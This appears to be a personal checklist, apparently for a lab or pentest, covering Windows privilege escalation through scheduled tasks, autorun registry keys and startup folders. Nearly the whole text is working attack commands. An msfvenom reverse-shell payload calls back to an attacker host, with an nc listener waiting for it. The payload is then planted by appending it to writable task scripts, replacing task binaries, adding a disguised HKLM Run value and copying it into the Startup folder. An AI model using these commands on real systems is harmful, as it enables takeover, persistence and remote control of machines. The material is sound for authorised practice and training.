# Windows privesc: scheduled tasks and autoruns

## A payload
On Kali, then into the target's upload/ folder for serve:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o rev.exe
rlwrap nc -lvnp <LPORT>
- [ ] Fetched to C:\Users\Public\rev.exe on the target, with the line serve files gives

## Scheduled tasks
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' } | Format-Table TaskName, TaskPath, State
schtasks /query /fo LIST /v | findstr /i /c:"TaskName" /c:"Task To Run" /c:"Run As User" /c:"Next Run Time"
- [ ] Tools miss tasks: every action's program read by hand, and icacls run on each one outside C:\Windows

## Check one task
THE-TASK is its name from the list:
schtasks /query /tn "THE-TASK" /fo LIST /v
(Get-ScheduledTask -TaskName "THE-TASK").Actions
(Get-ScheduledTask -TaskName "THE-TASK").Principal
- [ ] Run As User is SYSTEM or an administrator, and THE-PROGRAM-PATH is what it runs
- [ ] It repeats, or runs at a logon or a start I can cause
type "THE-PROGRAM-PATH"
icacls "THE-PROGRAM-PATH"
icacls "THE-FOLDER"
- [ ] (F), (M) or (W) for me, Users, Everyone or Authenticated Users, on the file or its folder
- [ ] A script that calls another program or script: check those too

## A writable script: add my line
From PowerShell, since its >> writes UTF-16 and breaks the script:
Add-Content -Path "THE-PROGRAM-PATH" -Value 'C:\Users\Public\rev.exe'
From cmd.exe:
echo C:\Users\Public\rev.exe>> "THE-PROGRAM-PATH"

## A writable program: replace it
move "THE-PROGRAM-PATH" C:\Users\Public\task.bak
copy C:\Users\Public\rev.exe "THE-PROGRAM-PATH"

## Set it off
schtasks /run /tn "THE-TASK"
- [ ] Access denied: wait for its next run time

## Run keys
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
icacls "THE-PROGRAM-PATH"
- [ ] A writable program in an HKLM Run key: replaced as above, and it runs as whoever logs on next
Whether I can write the HKLM Run key itself:
Get-Acl HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Format-List
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d C:\Users\Public\rev.exe /f

## Startup folders
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
copy C:\Users\Public\rev.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\rev.exe"
- [ ] Runs at any user's next logon, as that user

## Waiting for a logon
qwinsta
- [ ] An administrator logs on in this lab, or I may reboot: shutdown /r /t 0

## Afterwards
- [ ] The script, the program, the Run value or the startup file put back or removed
